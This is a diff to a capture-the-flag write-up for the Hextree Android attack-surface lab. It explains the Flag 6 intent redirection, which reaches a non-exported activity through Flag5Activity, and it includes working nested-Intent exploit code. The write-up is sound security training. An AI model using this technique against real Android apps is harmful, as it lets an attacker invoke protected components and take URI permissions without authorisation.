@@ -392,3 +392,58 @@ public void onClick(View v) {
     startActivity(outerIntent);
 }
 ```
+---
+
+### 🏳️ Flag 6 - Not exported ( Intent Redirection )
+
+* In AndroidManifest.xml notice activity is **not exported** .
+
+```bash
+<activity
+    android:name="io.hextree.attacksurface.activities.Flag6Activity"
+    android:exported="false"/>
+```
+
+* Notice activity logic :
+
+```bash
+    protected void onCreate(Bundle bundle) {
+        super.onCreate(bundle);
+        this.f = new LogHelper(this);
+        if ((getIntent().getFlags() & 1) != 0) {
+            this.f.addTag("FLAG_GRANT_READ_URI_PERMISSION");
+            success(this);
+        }
+    }
+```
+
+* Check again Flag 5 logic and notice , we can use this to **launches an attacker-controlled Intent** if the extra `reason` equals `"next"`, resulting in **Intent Redirection**.
+
+```bash
+else if (this.nextIntent.getStringExtra("reason").equals("next")) {
+    intent.replaceExtras(new Bundle());
+    startActivity(this.nextIntent);    // dangerous logic
+```
+
+* Since activity isn’t exported we need to abuse the class in Flag 5 activity to call Flag 6 activity from inside the same app .
+
+```bash
+ public void onClick(View v) {
+                Intent nextIntent = new Intent();
+                nextIntent.putExtra("reason", "next");
+								nextIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+								nextIntent.setClassName("io.hextree.attacksurface","io.hextree.attacksurface.activities.Flag6Activity");
+
+                Intent innerIntent = new Intent();
+                innerIntent.putExtra("return", 42);
+                innerIntent.putExtra("nextIntent", nextIntent);
+
+                Intent outerIntent = new Intent();
+                outerIntent.setClassName(
+                        "io.hextree.attacksurface",
+                        "io.hextree.attacksurface.activities.Flag5Activity"
+                );
+                outerIntent.putExtra(Intent.EXTRA_INTENT, innerIntent);
+                startActivity(outerIntent);
+        }});
+```
